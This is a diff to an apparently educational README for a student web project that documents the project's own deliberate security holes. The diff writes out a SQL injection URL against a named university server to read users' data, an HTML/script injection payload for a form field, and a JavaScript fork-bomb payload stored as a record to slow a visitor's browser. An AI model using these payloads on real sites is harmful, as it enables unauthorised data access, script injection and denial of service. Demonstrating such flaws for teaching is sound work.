@@ -25,18 +25,22 @@
 **HTML SQL Injection:**
 * SQL code can be inserted into the URL as placeholders are not used for MySQL credential checks
 * Use the following URL to access users' information without their credentials
-* flip3.engr.oregonstate.edu:6061/user/'\*'%20OR%20ALL&'\*'%20OR%20ALL
+```
+flip3.engr.oregonstate.edu:6061/user/'\*'%20OR%20ALL&'\*'%20OR%20ALL
+```
 
 ### HTML Injection Attack
 **To inject a script:**
 1. Sign into any existing user account
 2. Add a new record, using the following as the value for one field in the form: 
+```
 >"&amp;gt;<script>alert("Warning: This site is vulnerable to an attack")</script>
+```
 3. Note the popup alert warning of possible attack
 
 ### Denial of Service (DoS) Attack
 **Fork Bomb:**
-1. Make sure that the browser with the site open will not block popups
+1. Make sure that the active internet browser will not block popups
 2. Add a new record, using the following as the value for the record name:
 *  Change URL to link to user profile in use
 ```
@@ -47,6 +51,7 @@ function fork() {
 }
 fork(); </script>
 ```
-3. Select the name of the record (the code) from the record table
+3. Select the name of the record from the record table to intitate fork bomb
+**WARNING: This will slow down the user computer**
 * This does not bring down the school server (thankfully) rather it illustrates how to slow down a weak server
 * The Kyle account has this record already saved and ready to initiate 
